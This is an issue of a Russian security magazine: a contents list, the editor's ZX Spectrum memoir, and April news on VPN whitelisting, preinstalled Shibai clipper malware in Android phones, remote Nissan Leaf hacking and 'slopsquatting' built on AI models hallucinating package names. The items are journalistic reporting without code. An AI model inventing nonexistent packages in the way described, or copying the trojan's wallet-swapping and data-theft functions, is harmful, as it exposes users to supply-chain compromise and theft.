
            № 313
CONTENTS


     Тот самый компьютер
  Колонка главреда

    MEGANews
  Cамые важные события в мире инфосека за апрель

    ElonmuskWHM
  Как ФБР притворялось Илоном Маском и отмывало деньги для хакеров и драгдилеров

    Кривая дорожка
  Обфусцируем вызовы WinAPI новыми способами

    Тихий вызов
  Маскируем вызовы NTAPI от средств защиты

    Мод (Утопия)
  Разбираем по винтикам виртуальную машину Pathologic

    На радаре — Cutter
  Исследуем программы в графической надстройке Cutter для Radare2

    «Пасхалка» в Telegram
  Как я нашел способ авторизоваться без клауд-пароля и уведомлений

     InstallShield изнутри
  Препарируем виртуалку инсталлятора в x64dbg

    Реверс по-французски
  Изучаем приложение, написанное на WLanguage в среде WinDev

    Алмазный билет
  Как использовать доверие Kerberos в своих целях

    Уроки форензики
  Исследуем инцидент по следам в GitHub

    Метод чистой комнаты
  Учимся легально клонировать чужие продукты

    HTB LinkVortex
  Повышаем привилегии в Linux через симлинки

    HTB Administrator
  Эксплуатируем цепочку уязвимых ACL для захвата домена

    HTB Vintage
  Ломаем лабораторию Active Directory

    HTB Ghost
  Пробираемся через лес Active Directory

    Аудит по-взрослому
  Применяем Tetragon на практике (и убеждаемся в силе eBPF)

    Оракул в коробочке
  Запускаем продукты Oracle в контейнерах

    ZX-мания
  Изучаем современные версии ZX Spectrum

    Программатор из Arduino
  Прошиваем маршрутизатор подручными средствами

    Lumina 2 и HiDream
  Тестируем новые модели для создания картинок на своем компьютере

    Busy Bar
  Устройство от создателей Flipper, которое поможет меньше отвлекаться

    Хакеры.RU. Глава 0х16
  Код настоящего

    Хакеры.RU. Глава 0х17
  Ответный ход

    Хакеры.RU. Глава 0х18
  Конец файла
HEADER





Однажды мой папа  принес домой  уди‐
вительную  штуковину, за которую отдал
почти весь гонорар от опубликованной кни‐
ги. В типичной клетчатой сумке к нам в дом
приехал  ZX  Spectrum —  легендарный       Андрей Письменный                                                                                      Главный редактор
домашний  компьютер  британского  про‐        apismenny@gmail.com
исхождения, который привел в  IT целое
поколение жителей бывшего СССР.


Нам с отцом достался распространенный клон «Москва-48» в черном кор‐
пусе, отдаленно напоминающем тот самый классический «Спектрум». Ком‐
плектация была шикарной: дисковод для пятидюймовых дискет (рядовые
спектрумисты довольствовались магнитофоном и кассетами), два джойстика
и, самое главное, несколько коробок дискет, под завязку забитых играми.
  В течение следующей пары лет это был мой Game Pass. Ранние «квесты»
в духе Dizzy и Pyjamarama, экшены с крутейшей графикой вроде Exolon,
RoboCop и Golden Axe, адвенчуры Robin of the Wood, Saboteur, Knight Lore...
Ох, с каким увлечением я разбирался во всем этом по комично‑нелепым
переводам из книги «500 игр для ZX Spectrum»! Или чаще всего — просто
по наитию.





                         Те самые дискеты





                           Те самые игры

Позже, когда мне было лет десять, отец вытащил из ящика одну из «книжек»,
прилагавшихся к нашему «Спекки». Первая из сотни криво отпечатанных
на лепестковом принтере и подшитых нитками страниц гласила: «BASIC.
Руководство пользователя».
  С этого момента играм пришлось потесниться: часть драгоценного компь‐
ютерного времени я тратил на кодирование всякого графического баловства
и на попытки сконструировать примитивную игру.
  Во дворе я познакомился с другим спектрумистом, на семь лет старше
меня, который время от времени заваливался в гости с парой кассет. Игры
с них мы копировали на дискеты, страшно переживая, что что‑нибудь не про‐
читается, а потом сразу же и запускали скопированное.
   Тот же товарищ рассказал нам с отцом о волшебном месте под названием
Царицынский радиорынок, где я добыл следующий ценнейший артефакт —
книжку «Как написать игру для ZX Spectrum» с Робокопом на обложке. Вскоре
я стал упражняться в рисовании спрайтов в Art Studio и их переносе в код.
А еще — мечтать об описанном в одной из последних глав Laser Basic.
В отличие от встроенного он мог перерисовывать экран без мигания!
   Увы, Laser Basic попал ко мне в руки слишком поздно. Раздобыв его, я
успел покайфовать всего пару недель, а потом, как назло, сломался дис‐
ковод, и «Спектрум» пришлось отправить на покой. Вместо него отец купил
IBM-совместимую машину.
  Но компьютеры из детства не исчезают бесследно. В сердце каждого гика
для них отведено не просто место, а золотой пьедестал в конце ковровой
дорожки и лестницы из сотни ступенек.
   Обязательны и регулярные церемонии. Откопать, например, название той
самой игры, которую видел в детстве, найти ее и погонять в эмуляторе. Ну
или затеять что‑то посерьезнее — связанное с покупкой платы, пайкой и (в
особо запущенных случаях) притаскиванием домой старого телевизора.
  На днях мы опубликовали статью Валентина Холмогорова «ZX-мания. Изу‐
чаем современные версии ZX Spectrum». Там речь идет как раз о таких
чудо‑платах — клонах «Спектрума», слегка осовремененных для удобства
ностальгирующих.
  В конце Валентин очень верно подметил, что написание статей про тот
самый компьютер из детства — это тоже, по сути, ритуал кормления носталь‐
гии. Я тоже так делаю (и эта колонка, конечно, не исключение!).
  В 2011 году я работал в «Компьютерре‑Онлайн» и по работе занимался
поиском всяких странных и необычных штук, о которых можно было бы
написать. По чьей‑то наводке я набрел на ZX Evolution — современный клон
ZX Spectrum с потрясающими воображение характеристиками.
   Посуди сам: до 4 Мбайт оперативной памяти, IDE-интерфейс, позволя‐
ющий подключать жесткие диски и даже CD-ROM, крутая звуковая карта, пор‐
ты VGA и PS/2 для более‑менее современной периферии. И при этом в цен‐
тре всего — настоящий Z80. Немного размечтавшись, можно представить,
что это персоналка уровня примерно PC AT, но рожденная в мире победив‐
шего Sinclair Research, а не IBM.





   Собранный ZX Evolution Rev.CV в современном корпусе (фото с Reddit)





                        Загрузочный экран ZX Evolution

Я загорелся узнать об этом компе побольше и связался с разработчиками —
группой NedoPC. Результатом стали две публикации в «Компьютерре». Пер‐
вая — интервью, где трое участников команды рассказывают мне об истоках
и непростой судьбе ZX Evolution. Вторая посвящена истории ZX Spectrum
в целом и успеху в СССР в частности. Написал ее Максим Тимонин — один
из героев интервью. А я отредактировал и дополнил врезками.
  В процессе написания я от начала до конца прочел замечательный цикл
статей «Неизвестный Синклер», который горячо рекомендую всем бывшим
и нынешним спектрумистам. Там собрано множество неоднозначных, комич‐
ных и просто занимательных фактов о Клайве Синклере и жизни Sinclair
Research.
  Но самое главное — это исследование дает максимально доходчивый,
подробно изложенный и аргументированный ответ на вопрос, мучающий
многих из нас: почему успех ZX Spectrum не получил достойного развития.
Если не готов читать всё целиком, можешь посмотреть раздел «Успех и про‐
вал ZX Spectrum на Западе», который я добавил к статье Максима Тимонина.
   Сейчас ZX Evolution в готовом виде уже не купить: когда я проверял пос‐
ледний раз, за платами стояли очереди, да и компоненты потом нужно где‑то
доставать и припаивать вручную — как в старые времена!
  С ZX Evo у меня связана еще одна байка: вскоре после того интервью
один из экземпляров мне довелось забрать у разработчика и доставить
в Санкт‑Петербург на фестиваль ретрокомпьютеров Chaos Constructions.
Плату я вручил лично главному оргу Севе Потапову — для использования
в конкурсе демосцены.
   Иногда думаю, что прогадал, не прикупив тогда и себе «Эволюшен». Впро‐
чем, есть опасение, что он точно так же, как и тот самый ZX Spectrum из детс‐
тва, лежал бы годами в шкафу и ждал, когда у меня будет время и настроение
для очередного обряда ностальгии.
                                                    nefedova@glc.ru


В этом месяце: «белый список» Роскомнадзора содер‐
жит 75 тысяч IP-адресов, Павел Жовнер рассказал о работе
над Flipper One, в бюджетных Android-смартфонах снова
нашли предустановленную малварь, исследователи взло‐
мали Nissan Leaf, «галлюцинации» ИИ могут использоваться
для атак на разработчиков, и другие интересные события
прошедшего апреля.





«БЕЛЫЙ СПИСОК»
РКН
По информации СМИ, в «белый список», который был создан Центром
мониторинга и управления сетью связи общего пользования (ЦМУ ССОП),
подведомственным Роскомнадзору (РКН), входит уже 75 тысяч IP-адресов,
использующих иностранные протоколы шифрования. Это в шесть раз боль‐
ше, чем в 2023 году (тогда список насчитывал лишь 12 тысяч записей).
   Компании все активнее вносят данные об использовании иностранных
протоколов в своих корпоративных сетях в «белый список» РКН. Предста‐
вители бизнеса надеются, что попадание в этот перечень должно легали‐
зовать работу  IT-систем, ведь переход на  «российские  альтернативы»
не всегда возможен.
   Роскомнадзор просит владельцев частных иностранных виртуальных сетей
(virtual private network — VPN) предоставлять для внесения в этот список дан‐
ные об IP-адресах, протоколах и их назначениях в случае, если отказаться
от них по техническим причинам невозможно.
   Напомним, что в апреле на сайте Роскомнадзора появилось уведомление,
согласно которому владельцам российских VPN рекомендовалось отказаться
от использования иностранных протоколов шифрования при передаче дан‐
ных.

       Рекомендуем при передаче данных отказаться от иностранных протоколов
       шифрования, используемых в том числе приложениями, предоставляющими« доступ к запрещенной информации, — заявили тогда представители РКН. —
     В случае технической необходимости просим направлять для проверки
       заявления с обоснованием и указанием IP-адресов, в отношении которых
       необходимо сделать исключение, в ЦМУ ССОП по электронной почте:
        white_list@cmu.gov.ru. Предоставленные данные будут внесены в списки
       исключений.                 »Тогда эксперты заостряли внимание на том, что преждевременно говорить
о принудительных блокировках по факту использования иностранных про‐
токолов шифрования, а сам запрос предоставить данные сочли скорее
мерой для мониторинга, которая направлена на определение количества
пользователей зарубежных протоколов. Однако, по их словам, такая тактика
укладывается в общий тренд развития систем блокировок со стороны Рос‐
комнадзора.
   Так, по словам  главы отдела исследований в области ИИ  «Универ‐
ситета 2035» Ярослава Селиверстова, модернизация технических средств
противодействия угрозам на 60 миллиардов рублей, заложенная в федераль‐
ный проект «Инфраструктура кибербезопасности», направлена на анализ
трафика по сигнатурам протоколов, включая VPN, что «повысит уровень
эффективности ограничения доступа к средствам обхода блокировок VPN
до 96%». Однако Селиверстов обращает внимание на риск ложных срабаты‐
ваний блокировок для легальных бизнес‑процессов и увеличение бюрок‐
ратической нагрузки на компании.
   Федеральная  служба  по   техническому  и  экспортному   контролю
и Федеральная служба безопасности России ранее утвердили ряд технологи‐
ческих решений, которые используют российские алгоритмы шифрования.
Разрабатываются они российскими ИБ‑компаниями, включая ГК «Солар»,
«Код безопасности» и «ИнфоТеКС». К примеру, «ГОСТ VPN» уже использует‐
ся в криптошлюзах «Континент» и ViPNet.
   Как сообщает ведущий инженер CorpSoft24 Михаил Сергеев, они кон‐
курентоспособны в сферах, где требуется соответствие нацстандартам, нап‐
ример в  госсекторе и критической инфраструктуре. Однако сегодня их
использование ограничено в отраслях, зависящих от глобальных стандартов,
таких как международная торговля и IT-разработка, из‑за несовместимости
с западными системами.
  При этом эксперты отмечают, что для большинства внутренних процессов
российские компании используют VPN с иностранными протоколами, потому
что те проще в использовании и представлены в открытом доступе.
   Консультант по интернет‑безопасности компании  Positive Technologies
Алексей Лукацкий сообщил:

        Если Роскомнадзор будет блокировать все коммуникации не по ГОСТам, то
       российский бизнес сдаст свои адреса регулятору, чтобы не потерять воз‐«      можность вести коммуникации как со своими удаленными сотрудниками
      и офисами, так и с другими компаниями.                 »Гендиректор хостинг‑провайдера RUVDS Никита Цаплин добавил, что, по его
мнению, в будущем доступ к VPN может носить «разрешительный характер»
со стороны РКН.


47 ДНЕЙ ДЛЯ СЕРТИФИКАТОВ

Консорциум удостоверяющих центров и разработчиков ПО CA/Browser Forum проголосовал
за значительное сокращение срока службы сертификатов SSL/TLS: к 2029 году срок службы
сертификатов будет составлять всего 47 дней.

В настоящее время срок действия сертификатов и их Domain Control Validation (DCV) составля‐
ет 398 дней, но большинство центров сертификации согласны с тем, что это слишком долгий
срок в условиях современного ландшафта безопасности.


Основная цель этих изменений — уменьшение рисков, связанных с устаревшими сертифика‐
тами, устаревшими криптографическими алгоритмами и длительным использованием скомпро‐
метированных учетных данных.





ПОДРОБНОСТИ
О FLIPPER ONE
Один из авторов Flipper Zero Павел Жовнер поделился подробностями о том,
как идет работа над новым вариантом хакерского мультитула — Flipper One.
  В своем Telegram-канале разработчик опубликовал почти получасовое ви‐
део, в котором рассказал о создании интерфейса для нового устройства.
   Напомним, что еще в 2020 году Flipper Zero был анонсирован как младшая
модель в линейке пентестерских инструментов. Тогда Павел Жовнер расска‐
зывал на «Хабре», что старшая модель, Flipper One, планировалась как более
продвинутая версия для атак на проводные и беспроводные сети. One дол‐
жен был обладать всей функциональностью Zero, а также иметь отдельный
ARM-компьютер с Kali Linux на борту.
    Хотя после этого практически никаких известий о разработке Flipper One
не было, в 2023 году Павел Жовнер рассказал в интервью Дане Шеповалову,
что продвинутую версию мультитула рано списывать со счетов и активная
работа над Flipper One ведется:

     Мы хотим вообще жирный комбайн с FPGA и SDR, в котором все протоколы
       можно будет определить программно, но пока есть сомнения, будут ли« покупать устройство за 300–500 долларов.
         Так что проект в активном R&D, но пока нет понимания по важным частям.
       Например, не выбрали модуль Wi-Fi, потому что все существующие чипы,
       пригодные для атак, уже устарели. Возможно, придется спонсировать раз‐
        работку своего драйвера. В общем, увидим.                 »Как стало известно из нового видео, форм‑фактор девайса почти утвержден
и  для  Flipper  One  изготавливается  кастомный  экран  с  разрешени‐
ем 256 на 144 пикселя. Экран и разрешение подобраны исходя из муль‐
тиязычности, клавиатур и соотношения сторон в новом продукте.
  В настоящее время разработчики занимаются «придумыванием вооб‐
ражаемого интерфейса» и работают над эргономикой устройства. Павел
Жовнер рассказывает:

      Для начала нужно понять, что устройство существует в двух режимах. То есть
        у него есть сопроцессор, то есть какой‑то микроконтроллер, который« работает всегда. И когда система выключена, он реализует функцию отоб‐
      ражения уровня заряда и powerbank. То есть когда ты втыкаешь во Flipper
       что‑то зарядиться, он показывает, какой power delivery согласовался, сколь‐
       ко потребления. Он может включить подсветку на экране, там работают все
        кнопки, может быть, есть какое‑то простое меню. Его можно использовать
       как USB-тестер: допустим, подключить к какому‑то блоку питания, пос‐
       мотреть, есть ли там power delivery.
          Второй режим — это когда запущен основной процессор. То есть первый
       шаг: когда загружается bootloader и спрашивает, какую операционную сис‐
      тему ты хочешь (у тебя может быть Android TV, Linux, какой‑то другой Linux).
       Дальше, когда уже запущена и работает сама операционная система. Эти
       три режима, три шага должны управляться на экране с помощью кнопок,
        последовательно.                 »





Разработчики пришли к выводу, что для управления устройством понадобится
восемь кнопок: стик, D-pad с кнопкой «OK», кнопка для Alt + Tab (для перек‐
лючения между программами), четыре софтовых кнопки и кнопка питания.

      Это тупо компьютер, без NFC, RFID, SubGhz, Infrared, — пишет Павел Жов‐
      нер в комментариях под видео. — Все радио будет вставляться платами« расширения M.2. Так что воспринимать это стоит как Raspberry Pi с экраном
      на батарейке или как мини‑ноутбук в кармане, есть еще слово cyberdeck.                 »Кроме того, в видео разработчик делится планами по созданию FLIPCTL:

      Идея в том, чтобы этот интерфейс, который здесь живет, был отдельным
       софтом, самодостаточным. Представим, что оно называется FLIPCTL и это« TMUX-подобный интерфейс, который живет, допустим, на SPI-экране
       в 256 × 144. И точно так же, если ты подключился к Flipper по SSH и написал
          flipctl attach, ты увидишь такой же оранжевый экран маленького размера,
       как Flipper, и сможешь пользоваться им с клавиатуры. Он будет точно так же
        дублироваться, если ты его запустишь, допустим, на Rockchip’овской прис‐
       тавке, и он понимает, что это Wayland или „Иксы“, и рисует это уже в „Иксах“.
         У тебя может быть тачскрин, другое разрешение, другое соотношение
        сторон, и он точно так же, как TMUX, адаптируется под это разрешение.                 »Жовнер объясняет, что, по его мнению, все кибердеки плохи тем, что никто
не пишет для них специальный GUI, а полноценной ОС на крохотном экране
попросту неудобно пользоваться:

        Никто никогда не пишет GUI, а я хочу сделать GUI, который реализует сис‐
      темные фичи: SystemD крутит, NetworkManager и прочее. Плюс врапперы« для прикладного софта. То есть какой‑то свой язык, Python-сабпроцесс
      и обертка для прикладных userspace-программ, и чтобы комьюнити туда
       допиливало. То есть сегодня сделали обертку для Nmap, завтра — обертку
      для программы Traceroute, послезавтра — для htop и так далее. Как мне
        кажется, это намного проще, поэтому я ожидаю, что комьюнити таких врап‐
      перов под свои программы напишет много.                 »Он отмечает, что было бы здорово, если бы идея GUI для встраиваемых сис‐
тем могла развиваться и приносила пользу сторонним разработчикам.





       Представим, что какой‑то Supermicro делает свой сервер. И хочет встроить
       в него GUI. Для Supermicro это крайне тяжело, он не напишет свой GUI. Что« мы можем ему предложить? Представим, что китайцы изготавливают модуль,
       в котором есть интерфейс FLIPCTL. То есть это существует как отдельный
       программный продукт. И он продает такой „экранчик“, который подключается
      по USB или еще как‑то, и говорит, что это FLIPCTL Compatible. И любой
       OpenWrt-роутер, любой сервер сможет поставить себе эту штуку и запустить
        конкретно свой враппер, для своей оболочки, которая ему нужна для кон‐
       кретного прикладного софта. Единственное, что ему надо писать, — этот
       враппер. Это идея, как можно принести пользу человечеству, делая этот GUI,
      который никто и никогда в жизни не возьмется делать, я абсолютно уверен.                 »

КОМПАНИИ НЕ ЗНАЮТ СОБСТВЕННУЮ ИНФРАСТРУКТУРУ
Специалисты Positive Technologies опросили более 130 компаний из сфер ИT, промышленного
производства, ретейла, финансов, из топливно‑энергетического комплекса и других секторов
экономики.

Оказалось, что 54% респондентов знают не про все устройства и системы, используемые
в организации, хотя и стремятся к полной видимости.

Каждая третья компания не уверена, что обладает точной информацией об аппаратном обес‐
печении и ПО, которое формирует основу ее операционной деятельности.





Около четверти респондентов (22%) сообщили, что считают важным только управлять акти‐
вами при их закупке, поддержке и эксплуатации.

При этом около 80% компаний вводят или выводят из эксплуатации активы как минимум раз
в квартал, что может привести к появлению уязвимостей и незащищенных мест в инфраструк‐
туре организации.





ВРЕДОНОСНЫЙ
WHATSAPP
«ИЗ КОРОБКИ»
Эксперты «Доктор Веб» предупредили, что в бюджетных Android-смартфонах,
имитирующих модели известных брендов, обнаружено предустановленное
вредоносное ПО. Вредоносный код добавлен в мессенджер WhatsApp и нап‐
равлен на кражу криптовалют через буфер обмена.
   Эта кампания была замечена еще в прошлом году: с июня 2024 года
в «Доктор Веб» начали обращаться клиенты, которые установили антивирус
Dr.Web Security Space на свежеприобретенные Android-телефоны. При ска‐
нировании системного раздела прошивки антивирус обнаруживал подоз‐
рительное приложение, замаскированное под мессенджер WhatsApp.
   Кражу информации путем перехвата или подмены данных, которые поль‐
зователь копирует в буфер обмена, называют термином «клиппинг». Чаще
всего клипперы нацелены на поиск в буфере последовательностей символов,
соответствующих адресам криптокошельков. В среднем такие строки содер‐
жат от 25 до 42 символов. Для удобства работы с такими данными поль‐
зователи обычно используют стандартные операции «копировать» и «вста‐
вить». Клиппер может воспользоваться этим, перехватив содержимое буфера
обмена и незаметно подменив все адреса криптовалютных кошельков при‐
надлежащими операторам малвари.
  По словам специалистов, злоумышленники каким‑то образом получили
доступ к цепочке поставок ряда китайских производителей смартфонов
на базе Android. Жалобы именно на такие смартфоны и поступали от поль‐
зователей.
  В большинстве случаев скомпрометированные «из коробки» устройства
были представлены в нижнем ценовом сегменте и имели названия, соз‐
вучные с моделями известных брендов: S23 Ultra, Note 13 Pro, P70 Ultra и так
далее.





                           Карточки зараженных устройств

При этом их технические характеристики были далеки от заявленных. Дело
в том, что в состав прошивки входило скрытое приложение, позволяющее
с  легкостью  изменить  всю  отображаемую  техническую  информацию
об устройстве не только в системном меню, но и в отчетах таких приложений,
как AIDA64 и CPU-Z.
   Кроме того, несмотря на то что в разделе «Об устройстве» было заявлено
об установленной последней версии Android 14, на самом деле все устрой‐
ства работали под управлением одного и того же билда Android 12.
   Как выяснилось, треть перечисленных ниже моделей, в которых была
обнаружена малварь, выпускается под брендом SHOWJI. Производителей
остальных моделей исследователям идентифицировать не удалось.





Троянизированная версия WhatsApp была создана с помощью инструмента
LSPatch. Этот фреймворк позволяет изменять поведение основного при‐
ложения, не вмешиваясь в его код, а загружая для этого дополнительные
программные модули. В данном случае мошенники поместили в папку assets
вредоносный модуль com.whatsHook.apk, выполняющий следующие функции:
 • подмена адреса обновлений WhatsApp серверами злоумышленников;
 • поиск и подмена в сообщениях адреса кошельков Tron (34 символа,
   начинается с T) и Ethereum (42 символа, начинается с 0x);
 • отправка злоумышленникам всех сообщений и изображений из папок
   DCIM, PICTURES, SCREENSHOTS и так далее, чтобы найти скриншоты
   с seed-фразами от кошельков.

Также вся информация об устройстве (производитель, модель, языковые
настройки  и  имя  троянизированного  приложения)  тоже  передается
на управляющий сервер.
  В классификации «Доктор Веб» этот троян получил название Shibai из‑за
строки в коде, которая, видимо, является отсылкой к названию криптовалюты
Shiba Inu (SHIB).
   Исследователи подчеркивают, что эта кампания очень масштабна и ана‐
логичным образом мошенники модифицировали порядка 40 приложений.
Среди них — WhatsApp и Telegram, а также другие мессенджеры, сканеры
QR-кодов и так далее. В большинстве случаев вмешательству подвергались
приложения криптокошельков (MathWallet, Trust Wallet и другие).
  В общей сложности было обнаружено более 60 управляющих серверов,
а для распространения вредоносных приложений задействованы поряд‐
ка 30 доменов.
   Также экспертам удалось получить некоторые сведения о финансовых
успехах авторов этой малвари. В одном из отслеживаемых кошельков были
замечены поступления за два года в размере более миллиона долларов
США. В другом кошельке обнаружили еще полмиллиона. Остальные кошель‐
ки (примерно 20 штук) хранили суммы до 100 тысяч долларов. Полную кар‐
тину доходности этой кампании составить невозможно, так как адреса
кошельков получаются с сервера злоумышленников и могут быть разными.





                  Один из кошельков злоумышленников





РОСКОМНАДЗОР О ЗАРУБЕЖНЫХ ХОСТИНГАХ
В пресс‑службе ведомства сообщили, что могут ограничить работу некоторых зарубежных про‐
вайдеров хостинга с учетом рисков для российских ресурсов:

       С учетом рисков, которым подвержены ресурсы, размещенные на мощ‐→       ностях этих компаний, работа таких провайдеров хостинга может быть огра‐
        ничена на территории РФ. В таком случае они не смогут оказывать услуги хос‐
       тинга российским организациям.


Речь идет о компаниях, подлежащих «приземлению». В этот список на сегодняшний день вклю‐
чены 12 хостинг‑провайдеров, и весной прошлого года Роскомнадзор уже ограничил доступ
к сайтам нескольких иностранных хостеров из этого перечня.
   В пресс‑службе ведомства подчеркнули, что организации, которые размещают свои ресур‐
сы на мощностях зарубежных провайдеров хостинга, могут столкнуться с серьезными угро‐


           Так, иностранные хостинг‑провайдеры могут в любой момент разорвать сот‐зами:→        рудничество с владельцем ресурса, например по политическим причинам
      или внутренним решениям компании, оставив сайт недоступным для поль‐
        зователей. На серверах зарубежных провайдеров информация не всегда
       защищена от несанкционированного доступа. Это ставит под угрозу конфиден‐
       циальность данных пользователей и безопасность бизнеса, поскольку утечка
       информации может привести к финансовым и репутационным потерям.





                                     Продолжение статьи →
← Начало статьи





 УДАЛЕННЫЙ ВЗЛОМ
 NISSAN LEAF
   Исследователи из компании PCAutomotive продемонстрировали ряд уяз‐
   вимостей в электромобиле Nissan Leaf. Специалисты показали, что баги мог‐
  ли использоваться для удаленного взлома автомобилей, слежки и полного
   перехвата различных функций.
     Компания PCAutomotive специализируется на пентестах и анализе угроз
  для автомобильной и финансовой отраслей. О взломе Nissan Leaf эксперты
   рассказали на конференции Black Hat Asia 2025.
     Объектом изучения стал электромобиль Nissan Leaf второго поколения,
  выпущенный в 2020  году. Обнаруженные в нем  уязвимости позволяли
   использовать функции Bluetooth в информационно‑развлекательной системе
   авто для проникновения во внутреннюю сеть.
      Эксперты рассказывают, что эти проблемы позволяли повысить привиле‐
   гии и установить канал связи с управляющим сервером с помощью сотовой
   связи, что обеспечивало скрытый и постоянный доступ к электромобилю
   непосредственно через интернет.
     Злоумышленник мог использовать обнаруженные уязвимости для слежки
  за владельцем Nissan Leaf, отслеживая местоположение авто, делая скрин‐
  шоты информационно‑развлекательной системы и даже записывая раз‐
  говоры людей в салоне.
     Кроме того, проблемы позволяли удаленно контролировать различные
   функции авто, включая открытие дверей, работу стеклоочистителей, клак‐
   сона, зеркал, окон, фар и даже рулевого колеса, в том числе во время дви‐
  жения.
      Уязвимостям были присвоены восемь идентификаторов CVE: от CVE-
  2025-32056 до CVE-2025-32063.
      Исследователи рассказали, что процесс раскрытия информации о багах
   начался еще в августе 2023 года, но специалисты компании Nissan подтвер‐
  дили наличие проблем только в январе 2024 года, а присвоение идентифика‐
  торов CVE заняло еще около года.
    В  дополнение  к  своему  докладу  специалисты  опубликовали  видео,
   в котором наглядно продемонстрировали, как использовали свои эксплоиты
  для удаленного взлома Nissan Leaf.
      Представители Nissan сообщили СМИ, что компания не может раскрывать
  детали уязвимостей и предпринятых защитных мер из соображений безопас‐
   ности. При этом в компании подчеркнули, что будут продолжать разрабаты‐
   вать и внедрять технологии для борьбы с кибератаками «ради безопасности
  и спокойствия клиентов».


 40% РОССИЙСКИХ КОМПАНИЙ УНИЧТОЖАЮТ ДАННЫЕ
  ВРУЧНУЮ
   Согласно исследованию компании «Гарда», почти 40% операций по уничтожению персональ‐
   ных данных совершаются вручную, а в 12% случаев — не совершаются вовсе.

   Так, 39% компаний используют ручной поиск данных с удалением в базах, файловых хранили‐
   щах и на отдельных рабочих местах, 25% применяют шредеры и сжигание совместно со спе‐
   циализированным ПО, 10% — только механическое уничтожение, 10% — другие методы,
   и только у 3% имеется сертифицированное ПО. Еще 12% компаний не удаляют данные вовсе.

   Главными проблемами при удалении данных являются отсутствие инструментов автоматизации
     (22%), хранение информации в разных системах (20%) и строгие требования к докумен‐
   тированию процесса (2%).





 ПЕРЕЗАГРУЗКА РАЗ
 В ТРИ ДНЯ
   Компания  Google  внедряет новый  защитный механизм  для  устройств
  под управлением Android. Он будет автоматически перезагружать заблокиро‐
   ванные и неиспользуемые устройства после трех дней бездействия, возвра‐
  щая их память в зашифрованное состояние.
       Хотя в компании не объясняют, какие именно мотивы кроются за добав‐
   лением этой функции, судя по всему, она должна затруднить извлечение дан‐
  ных с устройств при помощи киберкриминалистических инструментов.
      Отметим,  что еще  в  январе 2024  года  разработчики защищенной
  GrapheneOS,  ориентированной на  конфиденциальность и безопасность,
   предложили добавить в Android функцию автоматической перезагрузки, что‐
  бы затруднить эксплуатацию неких уязвимостей в прошивке таких устройств,
   как Google Pixel и Samsung Galaxy. По данным специалистов, эти уязвимости
   использовались криминалистами для извлечения информации с устройств.
      Новая функция автоперезагрузки вошла в последнее обновление сер‐
  висов Google Play (25.14), в раздел Security & Privacy. Разработчики пишут:

           Благодаря этой функции ваше устройство автоматически перезагружается,
         если оно заблокировано в течение трех дней подряд. «                  »   Дело в том, что спонтанная перезагрузка переводит устройство из режима
   «после первой разблокировки» (After First Unlock, AFU), в котором данные
   пользователя расшифровываются, становясь доступными для извлечения,
   в режим «до первой разблокировки» (Before First Unlock, BFU), в котором
   большинство пользовательских данных остаются зашифрованными и недос‐
   тупными до первой разблокировки устройства.
      Изъятые правоохранительными органами или украденные устройства,
   как правило, находятся в режиме AFU, поэтому, даже если они заблокиро‐
   ваны, эксперты могут извлечь хотя бы часть данных.
    В 2024 году разработчики GrapheneOS предлагали внедрить в Android-
   устройства механизм автоперезагрузки, который перезагружал бы систему
   после 18 часов бездействия, возвращая устройство в режим BFU. Теперь
  Google действительно добавляет такую функциональность, только выбрав
   в качестве интервала не 18 часов простоя, а 72 часа.
      Напомним, что в прошлом году киберкриминалисты были удивлены стран‐
  ным поведением iPhone: устройства самостоятельно перезагружались, если
   какое‑то время не подключались к сети сотового оператора. Позже подтвер‐
  дилось, что с релизом iOS 18.1 разработчики Apple добавили в ОС защитную
   функцию автоматической перезагрузки.


  ПИРАТЫ ПРЕДПОЧИТАЮТ ЗОНУ .RU

   По информации аналитиков F6 (бывшая FAССT и Group-IB), весной 2025 года на доменную
   зону .ru приходилась наибольшая часть регистрируемых пиратских сайтов — 22,8% . Доменная
   зона .сom оказалась менее популярна — 12,7% регистраций, а за ней следует зона .online c
   10,8%.





   По данным экспертов, хотя доходы пиратов снизились с 87 миллионов долларов до 36 мил-
  лионов за шесть лет, объем контента продолжает увеличиваться. Так, в 2024 году заблокиро‐
   вано 12,5 миллиона единиц пиратского контента — на 42% больше, чем годом ранее.





   При этом 39% пиратских сайтов содержат малварь, уязвимости и фишинговые ссылки.

    Подчеркивается, что важно бороться не только с самими сайтами, но и с технической базой
   пиратства — CDN и видеобалансерами, которые снабжают контентом до 90% нелегальных
   онлайн‑кинотеатров.





   Инфраструктура пиратских CDN, напротив, обычно размещается не в России, а у хостеров,
   зарегистрированных в Нидерландах, США, Германии, Украине и Франции, что затрудняет
   их блокировку.

   Изучив 1400 пиратских сайтов, исследователи составили рейтинг самых популярных у россий‐
   ских пиратов CDN. Лидером стала Alloha: ее выбирает 61% администраторов нелегальных
   ресурсов. На втором месте — Rewall (42%), замыкает тройку Lumex (11%). Меньшей популяр‐
   ностью пользуются CDN Kodik (9%) и HDVB (7%).





    База одного пиратского балансера может содержать более 550 тысяч единиц видео, а в
   общей сложности инфраструктура всех  крупных  видеобалансеров  включает более 4400
   доменов.





 АТАКИ ЧЕРЕЗ
 «ГАЛЛЮЦИНАЦИИ»
   Эксперты предупредили о новом типе атак на цепочку поставок, получившем
   название слопсквоттинг (slopsquatting). Такие атаки становятся возможны
   благодаря широкому применению генеративных ИИ‑инструментов для кодин‐
   га, так как модели склонны к «галлюцинациям» и могут придумывать несущес‐
   твующие пакеты.
      Термин «слопсквоттинг» был предложен ИБ‑исследователем Сетом Лар‐
  соном (Seth Larson) и родственен слову «тайпсквоттинг». В отличие от тай‐
   псквоттинга, слопсквоттинг связан не с эксплуатацией опечаток, а с тем фак‐
   том, что  злоумышленники могут  создавать вредоносные пакеты в PyPI
  или npm, используя названия, которые часто «выдумывают» ИИ‑модели.
      Исследование, посвященное изучению «галлюцинаций» ИИ, показало, что
   примерно в 20%  случаев (576 тысяч  сгенерированных примеров кода
  на Python и JavaScript) рекомендуемые искусственным интеллектом пакеты
  не существовали.
     Причем  ситуация  выглядит хуже для  опенсорсных LLM (CodeLlama,
  DeepSeek,  WizardCoder и  Mistral), а  коммерческие  инструменты,  такие
   как ChatGPT-4, галлюцинируют примерно в 5% случаев, что тоже совсем
  немало.





   Количество  уникальных имен  таких  несуществующих  пакетов  превыси‐
  ло 200 тысяч, причем 43% из них постоянно появлялись в ответах LLM
  при похожих промптах, а 58% повторялись хотя бы один раз из десяти.
      Отмечается, что 38% названий несуществующих пакетов явно были вдох‐
   новлены настоящими пакетами, 13% были результатом опечаток, а осталь‐
  ные 51% оказались полностью вымышленными.





                                Общая схема атаки

